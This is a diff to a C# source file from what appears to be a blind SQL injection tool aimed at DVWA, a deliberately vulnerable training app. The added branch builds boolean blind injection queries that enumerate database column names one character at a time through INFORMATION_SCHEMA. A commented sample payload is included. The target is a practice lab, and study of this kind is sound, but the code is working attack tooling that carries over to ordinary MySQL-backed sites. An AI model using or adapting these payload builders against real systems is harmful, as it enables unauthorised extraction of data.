@@ -118,6 +118,20 @@ namespace Tool_SqlInjectionBlind_Dvwa
                 sql = str_f + Variable.Index_Tables + str_m + index + str_l;
                 return sql;
             }
+            else if(mode_sql == ResultRequest.Mode_SQL.COLUMNS_NAME)
+            {
+                //"1' AND ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
+                string str_f = sql.Substring(0, sql.LastIndexOf("LIMIT ") + "LIMIT ".Length);
+
+                int lc_f = sql.LastIndexOf("LIMIT ") + "LIMIT ".Length + Variable.Index_Columns.ToString().Length;
+                int lc_e = sql.LastIndexOf("1), " + index + ",") + 4;
+                string str_m = sql.Substring(lc_f, lc_e - lc_f);
+
+                string str_l = ", 1))) >= 127 #";
+                index += 1;
+                sql = str_f + Variable.Index_Columns + str_m + index + str_l;
+                return sql;
+            }
             return sql;
         }
     }
